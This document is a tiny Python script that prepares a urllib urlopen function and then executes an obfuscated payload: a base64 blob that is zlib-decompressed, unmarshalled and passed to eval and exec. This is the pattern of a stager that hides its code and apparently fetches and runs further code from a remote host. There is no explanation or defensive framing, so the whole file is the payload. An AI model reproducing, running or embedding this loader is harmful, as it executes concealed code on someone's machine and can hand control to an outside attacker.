import sys,zlib,base64,marshal,json,urllib
if sys.version_info[0] > 2:
    from urllib import request
urlopen = urllib.request.urlopen if sys.version_info[0] > 2 else urllib.urlopen
exec(eval(marshal.loads(zlib.decompress(base64.b64decode(b'eJwrdWFgYCgtyskvSM3TUM8oKSmw0tc3tDDVMzKw1DM0M9IzNDKzsjSwNNRPzslMzSsp1i8uSUxPLSrWz/Mw0yuoVNfUK0pNTNHQBAD6EhVO')))))